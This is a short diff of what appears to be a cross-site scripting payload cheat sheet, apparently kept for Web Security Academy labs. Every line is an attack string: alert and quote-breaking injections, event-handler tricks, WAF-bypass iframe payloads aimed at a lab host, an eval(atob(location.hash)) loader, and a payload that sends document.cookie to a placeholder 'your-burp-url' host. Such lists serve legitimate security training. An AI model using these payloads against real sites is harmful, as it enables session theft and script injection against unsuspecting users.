@@ -6,7 +6,8 @@ javascript:alert(document.domain)
 \"-alert(xss)}//
 \';alert(99);//
 "onmouseover="alert(1)
-bypass waf : <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>>" onload=this.style.width='100px'>
+bypass waf : <iframe src="https://0ab1004303139a1682853d67005500dc.web-security-academy.net/?search="><body onresize=print()>" onload=this.style.width='100px'>
+             <iframe src="https://0ab1004303139a1682853d67005500dc.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 "<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
 Simple-Payload: ">\/></div><a onClick="top[['alert'][0]]('tehlan')">Click ME</a>
 Advance-Payload: ">\/></div><a onClick="top['location']['href']='//your-burp-url/?c='+document.cookie">Click ME</a>
